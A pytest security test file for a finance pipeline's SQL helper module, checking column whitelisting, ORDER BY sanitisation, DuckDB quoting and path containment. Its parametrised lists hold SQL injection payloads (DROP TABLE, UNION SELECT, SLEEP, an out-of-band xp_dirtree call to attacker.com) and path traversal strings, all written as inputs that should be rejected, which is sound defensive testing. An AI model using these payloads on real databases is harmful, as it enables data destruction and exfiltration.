"""
Security tests for SQL injection prevention.

Tests the sql_utils module that provides column whitelist validation
and order_by sanitization.

Security issue: #31
"""

from importlib import resources
from pathlib import Path

import pytest

from finjuice.pipeline.sql_utils import (
    VALID_COLUMNS,
    _load_packaged_schema_columns,
    is_safe_identifier,
    quote_duckdb_identifier,
    quote_duckdb_path_pattern,
    quote_duckdb_string_literal,
    resolve_duckdb_path_pattern,
    sanitize_order_by,
    validate_column_name,
    validate_columns,
)


def test_packaged_schema_resource_matches_source_template():
    """Packaged schema resource should stay in sync with the schema registry source."""
    repo_root = Path(__file__).resolve().parents[1]
    source_schema = repo_root / "templates" / "schema.yaml"
    packaged_schema = resources.files("finjuice.templates").joinpath("schema.yaml")

    assert packaged_schema.is_file()
    assert packaged_schema.read_text(encoding="utf-8") == source_schema.read_text(encoding="utf-8")


def test_packaged_schema_columns_include_current_v4_columns():
    """Installed-package fallback should expose the current SQL whitelist columns."""
    columns = _load_packaged_schema_columns()

    assert columns is not None
    assert len(columns) == 28
    assert "notes_manual" in columns
    assert {"category_rule", "category_final", "is_transfer_candidate"}.issubset(columns)


class TestValidateColumnName:
    """Test column name validation against whitelist."""

    def test_valid_column_amount(self):
        """Valid column name should return unchanged."""
        assert validate_column_name("amount") == "amount"

    def test_valid_column_datetime(self):
        """datetime is a valid column."""
        assert validate_column_name("datetime") == "datetime"

    def test_valid_column_row_hash(self):
        """row_hash is a valid column."""
        assert validate_column_name("row_hash") == "row_hash"

    def test_valid_column_tags_final(self):
        """tags_final is a valid column."""
        assert validate_column_name("tags_final") == "tags_final"

    def test_invalid_column_sql_injection(self):
        """SQL injection attempt should be rejected."""
        with pytest.raises(ValueError, match="Invalid column name"):
            validate_column_name("DROP TABLE transactions--")

    def test_invalid_column_semicolon(self):
        """Column with semicolon should be rejected."""
        with pytest.raises(ValueError, match="Invalid column name"):
            validate_column_name("amount; DROP TABLE")

    def test_invalid_column_unknown(self):
        """Unknown column name should be rejected."""
        with pytest.raises(ValueError, match="Invalid column name"):
            validate_column_name("nonexistent_column")

    def test_invalid_column_empty(self):
        """Empty string should be rejected."""
        with pytest.raises(ValueError, match="Invalid column name"):
            validate_column_name("")

    def test_invalid_column_star(self):
        """Wildcard (*) should be rejected."""
        with pytest.raises(ValueError, match="Invalid column name"):
            validate_column_name("*")

    def test_invalid_column_comment(self):
        """SQL comment should be rejected."""
        with pytest.raises(ValueError, match="Invalid column name"):
            validate_column_name("/* comment */")


class TestValidateColumns:
    """Test batch column validation."""

    def test_valid_columns_list(self):
        """Valid column list should return unchanged."""
        columns = ["amount", "datetime", "merchant_raw"]
        assert validate_columns(columns) == columns

    def test_empty_list(self):
        """Empty list should return empty list."""
        assert validate_columns([]) == []

    def test_invalid_column_in_list(self):
        """List with invalid column should raise error."""
        with pytest.raises(ValueError, match="Invalid column name"):
            validate_columns(["amount", "DROP TABLE", "datetime"])


class TestSanitizeOrderBy:
    """Test ORDER BY clause sanitization."""

    def test_simple_column_name(self):
        """Simple column name should work."""
        assert sanitize_order_by("datetime") == "datetime"

    def test_column_with_asc(self):
        """Column with ASC direction should work."""
        assert sanitize_order_by("datetime ASC") == "datetime ASC"

    def test_column_with_desc(self):
        """Column with DESC direction should work."""
        assert sanitize_order_by("datetime DESC") == "datetime DESC"

    def test_column_lowercase_direction(self):
        """Lowercase direction should be uppercased."""
        assert sanitize_order_by("datetime desc") == "datetime DESC"

    def test_multiple_columns(self):
        """Multiple columns should work."""
        result = sanitize_order_by("datetime DESC, amount ASC")
        assert result == "datetime DESC, amount ASC"

    def test_multiple_columns_no_direction(self):
        """Multiple columns without direction should work."""
        result = sanitize_order_by("datetime, amount")
        assert result == "datetime, amount"

    def test_injection_semicolon(self):
        """SQL injection with semicolon should be rejected."""
        with pytest.raises(ValueError, match="Invalid characters"):
            sanitize_order_by("datetime; DROP TABLE transactions--")

    def test_injection_comment(self):
        """SQL injection with comment should be rejected."""
        with pytest.raises(ValueError, match="Invalid characters"):
            sanitize_order_by("datetime-- DROP TABLE")

    def test_injection_multiline_comment(self):
        """SQL injection with multi-line comment should be rejected."""
        with pytest.raises(ValueError, match="Invalid characters"):
            sanitize_order_by("datetime /* comment */ DESC")

    def test_injection_single_quote(self):
        """SQL injection with single quote should be rejected."""
        with pytest.raises(ValueError, match="Invalid characters"):
            sanitize_order_by("datetime' OR '1'='1")

    def test_injection_double_quote(self):
        """SQL injection with double quote should be rejected."""
        with pytest.raises(ValueError, match="Invalid characters"):
            sanitize_order_by('datetime" OR "1"="1')

    def test_injection_backslash(self):
        """SQL injection with backslash should be rejected."""
        with pytest.raises(ValueError, match="Invalid characters"):
            sanitize_order_by("datetime\\")

    def test_invalid_column_name(self):
        """Invalid column name should be rejected."""
        with pytest.raises(ValueError, match="Invalid column name"):
            sanitize_order_by("nonexistent_column DESC")

    def test_invalid_direction(self):
        """Invalid direction should be rejected."""
        with pytest.raises(ValueError, match="Invalid sort direction"):
            sanitize_order_by("datetime DESCENDING")

    def test_empty_order_by(self):
        """Empty order_by should be rejected."""
        with pytest.raises(ValueError, match="Empty order_by"):
            sanitize_order_by("")

    def test_whitespace_only(self):
        """Whitespace-only order_by should be rejected."""
        with pytest.raises(ValueError, match="Empty order_by"):
            sanitize_order_by("   ")

    def test_special_characters_in_column(self):
        """Special characters in column name should be rejected."""
        with pytest.raises(ValueError, match="Invalid identifier"):
            sanitize_order_by("col@umn DESC")


class TestIsSafeIdentifier:
    """Test safe identifier checking."""

    def test_simple_name(self):
        """Simple name should be safe."""
        assert is_safe_identifier("column_name") is True

    def test_uppercase_name(self):
        """Uppercase name should be safe."""
        assert is_safe_identifier("COLUMN_NAME") is True

    def test_mixed_case_name(self):
        """Mixed case name should be safe."""
        assert is_safe_identifier("ColumnName") is True

    def test_name_with_numbers(self):
        """Name with numbers should be safe."""
        assert is_safe_identifier("column123") is True

    def test_name_starting_with_underscore(self):
        """Name starting with underscore should be safe."""
        assert is_safe_identifier("_private") is True

    def test_name_starting_with_number(self):
        """Name starting with number should NOT be safe."""
        assert is_safe_identifier("123column") is False

    def test_name_with_space(self):
        """Name with space should NOT be safe."""
        assert is_safe_identifier("column name") is False

    def test_name_with_hyphen(self):
        """Name with hyphen should NOT be safe."""
        assert is_safe_identifier("column-name") is False

    def test_name_with_semicolon(self):
        """Name with semicolon should NOT be safe."""
        assert is_safe_identifier("column;") is False

    def test_empty_string(self):
        """Empty string should NOT be safe."""
        assert is_safe_identifier("") is False

    def test_sql_injection_attempt(self):
        """SQL injection should NOT be safe."""
        assert is_safe_identifier("DROP TABLE") is False


class TestDuckDBBoundaryHelpers:
    """Test shared DuckDB SQL/path boundary helpers."""

    def test_quote_duckdb_identifier_escapes_double_quotes(self):
        """Embedded double quotes should stay inside the identifier."""
        assert quote_duckdb_identifier('merchant"raw') == '"merchant""raw"'

    def test_quote_duckdb_identifier_allows_edge_identifier_chars(self):
        """Quoted identifiers may contain spaces and punctuation safely."""
        assert quote_duckdb_identifier("merchant raw; drop") == '"merchant raw; drop"'

    def test_quote_duckdb_identifier_rejects_empty(self):
        """Empty quoted identifiers are invalid in DuckDB-generated SQL."""
        with pytest.raises(ValueError, match="must not be empty"):
            quote_duckdb_identifier("")

    def test_quote_duckdb_string_literal_escapes_single_quotes(self):
        """Embedded single quotes should stay inside the literal."""
        assert quote_duckdb_string_literal("Bob's Burgers") == "'Bob''s Burgers'"

    def test_quote_duckdb_string_literal_handles_non_string_values(self):
        """Non-string values should be stringified then quoted."""
        assert quote_duckdb_string_literal(20260524) == "'20260524'"

    def test_resolve_duckdb_path_pattern_keeps_glob_under_root(self, tmp_path: Path):
        """Relative glob patterns should resolve under the configured root."""
        root = tmp_path / "transactions"
        resolved = resolve_duckdb_path_pattern(root, "2026/05/*.csv")

        assert resolved == root.resolve(strict=False) / "2026" / "05" / "*.csv"

    @pytest.mark.parametrize(
        "pattern",
        [
            "../*.csv",
            "2026/../secrets.csv",
            "/tmp/private.csv",
            r"C:\Users\private.csv",
            r"2026\05\*.csv",
        ],
    )
    def test_resolve_duckdb_path_pattern_rejects_outside_patterns(
        self,
        tmp_path: Path,
        pattern: str,
    ):
        """Absolute paths, parent traversal, and backslash paths should be rejected."""
        with pytest.raises(ValueError):
            resolve_duckdb_path_pattern(tmp_path / "transactions", pattern)

    def test_quote_duckdb_path_pattern_escapes_root_quotes(self, tmp_path: Path):
        """Contained path literals should also escape quote-containing root paths."""
        quoted = quote_duckdb_path_pattern(tmp_path / "O'Reilly" / "transactions")

        assert quoted.startswith("'")
        assert quoted.endswith("'")
        assert "O''Reilly" in quoted


class TestValidColumnsConstant:
    """Test that VALID_COLUMNS is correctly loaded."""

    def test_contains_essential_columns(self):
        """Should contain essential transaction columns."""
        essential = {
            "row_hash",
            "datetime",
            "amount",
            "merchant_raw",
            "tags_final",
            "category_rule",
            "category_final",
        }
        assert essential.issubset(VALID_COLUMNS)

    def test_contains_28_columns(self):
        """Should contain all 28 v4 schema columns."""
        assert len(VALID_COLUMNS) == 28

    def test_is_frozenset(self):
        """Should be immutable (frozenset)."""
        assert isinstance(VALID_COLUMNS, frozenset)

    def test_no_dangerous_names(self):
        """Should not contain dangerous SQL keywords."""
        dangerous = {"drop", "delete", "update", "insert", "select", "where"}
        lowercase_columns = {col.lower() for col in VALID_COLUMNS}
        assert dangerous.isdisjoint(lowercase_columns)


class TestRealWorldAttackPatterns:
    """Test against real-world SQL injection patterns."""

    @pytest.mark.parametrize(
        "attack_string",
        [
            # Classic SQL injection
            "1; DROP TABLE transactions--",
            "1 OR 1=1",
            "1' OR '1'='1",
            "1'; DROP TABLE transactions;--",
            # Union-based injection
            "1 UNION SELECT * FROM users--",
            "1 UNION ALL SELECT NULL--",
            # Error-based injection
            "1 AND 1=CONVERT(int,(SELECT @@version))--",
            # Blind SQL injection
            "1 AND 1=1",
            "1 AND SLEEP(5)--",
            # Out-of-band injection
            "1; EXEC xp_dirtree('\\\\attacker.com\\share')--",
            # Comment variations
            "datetime/*comment*/DESC",
            "datetime#comment",
            "datetime%00",
            # Encoding tricks
            "datetime%27",
            "datetime%3B",
        ],
    )
    def test_attack_patterns_rejected(self, attack_string):
        """Various SQL injection patterns should be rejected."""
        with pytest.raises(ValueError):
            sanitize_order_by(attack_string)

    @pytest.mark.parametrize(
        "attack_string",
        [
            "DROP TABLE transactions",
            "'; DELETE FROM transactions WHERE '1'='1",
            "1; UPDATE transactions SET amount=0--",
            "UNION SELECT password FROM users",
        ],
    )
    def test_column_injection_rejected(self, attack_string):
        """SQL injection through column names should be rejected."""
        with pytest.raises(ValueError):
            validate_column_name(attack_string)
